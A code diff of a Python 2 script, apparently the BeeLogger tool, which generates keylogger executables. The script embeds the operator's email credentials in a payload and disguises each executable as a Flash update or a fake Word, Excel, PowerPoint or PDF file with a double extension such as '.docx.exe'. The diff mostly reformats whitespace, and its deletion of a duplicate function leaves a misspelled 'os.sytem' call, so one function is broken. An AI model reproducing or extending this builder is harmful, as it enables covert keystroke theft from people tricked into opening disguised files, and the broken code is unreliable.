@@ -7,17 +7,12 @@
 import os
 import sys
 import time
-
-
 if not os.geteuid() == 0:
     sys.exit('BeeLogger must be run as root')
-
 def clear():
     os.sytem('clear')
-
 def begin():
     os.system('sudo rm -Rf dist')
-
     email = raw_input('Type your email to receive logs: ')
     epass = raw_input('Type your email password: ')
     print '\n'
@@ -25,28 +20,23 @@ def begin():
     print ' email: ' + email
     print ' password: ' + epass
     print '###############################'
-    print '\n'
-    
+    print '\n'    
     ask = raw_input('These info above are correct? (y/n) :')
     if ask == 'y':
         pass
     else:
         begin()
-
     template = open('Templates/Bee.py', 'r')
     o = template.read()
-
     payload = '#/usr/bin/python\n'
     payload += '# -*- coding: utf-8 -*-\n'
     payload += 'EEMAIL = ' + "'" + email + "'" + '\n'
     payload += 'EPASS = ' + "'" + epass + "'" + '\n'
     payload += str(o)
-
     with open('k.py', 'w') as f:
         f.write(payload)
         f.close()	
     template.close()
-
 def warn():
     sys.stdout.write(YELLOW + '''
               %          %                   :::
@@ -75,14 +65,10 @@ def warn():
                      ZZ%%%%%%%%%%%%%%%%%%%''' + WHITE + ''' Usᴇ ɪᴛ ᴊᴜsᴛ ꜰᴏʀ''' + RED + ''' ᴡᴏʀᴋ''' + WHITE + ''' ᴏʀ ''' + RED + '''ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ''' + WHITE + ''' !
 ''')
 
-def clear():
-    os.system('clear')
-
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 def heading():
     os.system('clear')
-
     sys.stdout.write(YELLOW + '''
 
                 .' '. I BEE YOU  __
@@ -90,13 +76,10 @@ def heading():
         .         .         . -{{#(|8)
           ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Alisson Moretto (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END) 
     print ' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n'
-
 def pp():
     sys.stdout.write(GREEN + '''Thank You for using Bee, Think Great, Fly High!  \n''' + END)
-
 def option():
-   print ' {0}[{1}1{0}]{1} Aᴅᴏʙᴇ Fʟᴀsʜ Uᴘᴅᴀᴛᴇ '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fᴀᴋᴇ Wᴏʀᴅ ᴅᴏᴄx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fᴀᴋᴇ Pᴏᴡᴇʀᴘᴏɪɴᴛ ᴘᴘᴛx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fᴀᴋᴇ Aᴄʀᴏʙᴀᴛ ᴘᴅꜰ '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Bʟᴀɴᴋ Exᴇᴄᴜᴛᴀʙʟᴇ '.format(BLUE, WHITE) 
-
+    print ' {0}[{1}1{0}]{1} Aᴅᴏʙᴇ Fʟᴀsʜ Uᴘᴅᴀᴛᴇ '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fᴀᴋᴇ Wᴏʀᴅ ᴅᴏᴄx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fᴀᴋᴇ Pᴏᴡᴇʀᴘᴏɪɴᴛ ᴘᴘᴛx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fᴀᴋᴇ Aᴄʀᴏʙᴀᴛ ᴘᴅꜰ '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Bʟᴀɴᴋ Exᴇᴄᴜᴛᴀʙʟᴇ '.format(BLUE, WHITE) 
 def main():
     clear()
     path = '.OK'
@@ -115,14 +98,11 @@ def main():
     raw_input('                                                PRESS [ENTER] TO CONTINUE')
     clear()
     heading()
-
     try:
-
         while True:
 
             header = ('{0}Bee{1} > {2}'.format(YELLOW, WHITE, END))
-            choice = raw_input(header)
-            
+            choice = raw_input(header)            
             if choice.upper() == 'Q' or choice.upper() == 'QUIT':
 		clear()
 		pp()
@@ -149,8 +129,7 @@ def main():
                 name = 'Bee_Flash_.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
-                heading()
-                              
+                heading()                              
                 print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name           
             elif choice == '2':
                 begin()
@@ -159,8 +138,7 @@ def main():
                 name = 'Bee_Word_.docx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
-                heading()
-                                              
+                heading()                                              
                 print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '3':
                 begin()
@@ -169,8 +147,7 @@ def main():
                 name = 'Bee_Excel_.xlsx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
-                heading()
-                                              
+                heading()                                              
                 print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '4':
                 begin()
@@ -179,8 +156,7 @@ def main():
                 name = 'Bee_Power_.pptx.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear() 
-                heading()
-                                              
+                heading()                                              
                 print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
             elif choice == '5':
                 begin()
@@ -189,8 +165,7 @@ def main():
                 name = 'Bee_AcrobatPDF_.pdf.exe'
                 os.rename('dist/k.exe', 'dist/' + name)
                 clear()
-                heading()
-                                              
+                heading()                                              
                 print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
             if choice.upper() == 'U' or choice.upper() == 'UPDATE':
 		os.system('python2.7 updater.py')
@@ -199,7 +174,6 @@ def main():
 		pp()
                 raise SystemExit
             
-
     except KeyboardInterrupt:
 	clear()
 	pp()
